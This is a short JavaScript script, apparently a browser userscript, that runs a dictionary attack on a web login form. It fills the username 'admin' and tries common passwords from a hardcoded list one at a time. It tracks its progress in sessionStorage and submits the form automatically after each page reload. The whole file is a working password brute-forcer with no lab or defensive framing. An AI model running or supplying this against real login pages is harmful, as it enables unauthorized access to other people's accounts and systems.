let index = 0;
const username = "admin";
const wordlist = [
    "administrator",
    "admin",
    "root",
    "love",
    "123456",
    "12345678",
    "123456789",
    "1234567890",
    "hate",
    "hater",
    "dragon",
    "password",
    "qwerty",
    "12345",
    "1234",
    "baseball",
    "monkey",
    "letmein",
    "hallo",
    "passwort",
    "schatz",
    "hallo123",
    "qwertz",
    "schatz",
    "hallo1",
    "admin",
    "toor",
    "minad",
    "hello",
    "secret",
    "secure",
    "sicher",
    "pw123",
    "pw123456",
    "login",
    "invalid"
]

// const loginElement = document.querySelector('input[type="text"]');
const loginElement = document.querySelector('input[name="username"]');
const pwElement = document.querySelector('input[type="password"]');

// save wordlist index
if (sessionStorage.getItem('index')) {
    index = parseInt(sessionStorage.getItem('index'));
    if (index < wordlist.length - 1) {
        index++;
    }
}

loginElement.value = username;
pwElement.value = wordlist[index];

// show current pw under input field
pwElement.insertAdjacentHTML('afterend', "<br/>" + wordlist[index]);

// save current index
sessionStorage.setItem('index', index.toString());

// only submit if elements are there
if (loginElement && pwElement && index < wordlist.length - 1 && sessionStorage.getItem('index')) {
    document.querySelector('input[type="submit"]').click();
    document.querySelector('form').submit();
}
